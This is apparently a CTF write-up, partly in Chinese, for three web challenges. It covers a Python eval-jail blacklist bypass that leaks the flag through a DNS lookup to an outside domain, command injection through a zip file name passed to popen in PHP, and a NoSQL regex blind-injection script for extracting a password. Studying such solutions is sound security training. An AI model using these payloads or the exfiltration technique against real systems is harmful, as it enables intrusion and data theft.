
# web
### Escape_Plan

#python_escape
```python
import base64

from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def challenge_3():
cmd = request.form.get("cmd", "")
if not cmd:
	return """<pre>
import requests, base64
exp = ''
requests.post("", data={"cmd": base64.b64encode(exp.encode())}).text
</pre>
"""

try:
	cmd = base64.b64decode(cmd).decode()
except Exception:
	return "bad base64"

black_char = [
	"'", '"', '.', ',', ' ', '+',
	'__', 'exec', 'eval', 'str', 'import',
	'except', 'if', 'for', 'while', 'pass',
	'with', 'assert', 'break', 'class', 'raise',
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
]
for char in black_char:
	if char in cmd:
		return f'failed: `{char}`'

msg = "success"
try:
	eval(cmd)
except Exception:
	msg = "error"

return msg

```

--- 
*看看wp*
如上,我们需要绕过黑名单,python的机制允许我们使用全角字符执行代码,数字的绕过可以采用 len函数

```Python
import requests
import base64
#Dns 外带
shell='ping -c 1 `/readflag`.c17fafb7.dns.dnsmap.org'
s=''
for i in shell:
    s+="chr("+str(ord(i))+")+"
print(s[0:-1])
payload = payload = "__import__('os').popen({})".format(s[0:-1])

# 38:len()-9
payload1 = "ᵉxec(repr(request)[(len(black_char[len([])])<<(len(black_char[len([])])))|(len(black_char[len([])])<<(len(black_char[len([])])<<len(black_char[len([])])))|(len(black_char[len([])])<<(len(black_char[len([])])<<len(black_char[len([])])<<len(black_char[len([])])|len(black_char[len([])]))):len(repr(request))-int(black_char[len(black_char)-len(black_char[len([])])])])"
data = {"cmd": base64.b64encode(payload1.encode('utf-8')).decode('utf-8')}
url='http://47.102.115.18:30634/?'+payload
response=requests.post(url=url,data=data)
print(response.text)
```

但是还是过滤了 `'`,需要通过外部参数绕过,payload截取字符串

### d3cloud

---
admin/admin 登录后发现 media manager 存在FilesystemAdapter.php  ,审计后上传文件出存在命令执行漏洞
```php
    public function putFileAs($path, $file, $name, $options = [])
    {
        $supported_file = array('gif','jpg','jpeg','png','ico','zip','mp4','mp3','mkv','avi','txt');
        $file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));
        if (!in_array($file_type, $supported_file)) {
            return false;
        }
        $stream = fopen($file->getRealPath(), 'r+');
        $result = $this->put(
            $path = trim($path.'/'.$name, '/'), $stream, $options
        );
        if (is_resource($stream)) {
            fclose($stream);
        }
        if($file->getClientOriginalExtension() === "zip") {
        //其中 文件名可控
            $fs = popen("unzip -oq ". $this->driver->getAdapter()->getPathPrefix() . $name ." -d " . $this->driver->getAdapter()->getPathPrefix(),"w");
            pclose($fs);
        }
        return $result ? $path : false;
    }
```

### d3node
#nosql 


```Python 
import requests
import string

url = "http://106.14.124.130:30120/user/LoginIndex"

# passwd = "dob2xdriaqpytdyh6jo3"
while True:
    for char in string.printable:
        if char not in ['*', '+', '.', '?', '|', '#', '&', '$', '(', ')','[','\\','[']:
            data = {"username": "admin", "password": {"$regex": f"^{passwd+char}"}}
        r = requests.post(url,json=data)
        # print(r.text)
        if "Login failed,invalid username or password" not in r.text:
            passwd += char
            print(passwd)
            break
```


```sql
db.users.find({'username':'admin', 'password':{$regex:^passwd}})
```


# reverse

# pwn

# crypto

# Misc


---
*相关wp*

https://fq6p9pyo5tt.feishu.cn/docx/InUFdQUKdozf8yx5IhGcf5zInSe

https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&mid=2247486967&idx=1&sn=ad55ddd11c6bfa17843270625f5f92fc&chksm=cf53cd41f8244457c2db68626c91f2e4564d756b903222f3a913e89f211d475418864c5041bc&mpshare=1&scene=23&srcid=0501bEUrW8ydbpm175TL5FFn&sharer_sharetime=1682949687637&sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392#rd



2023-05-02   02:59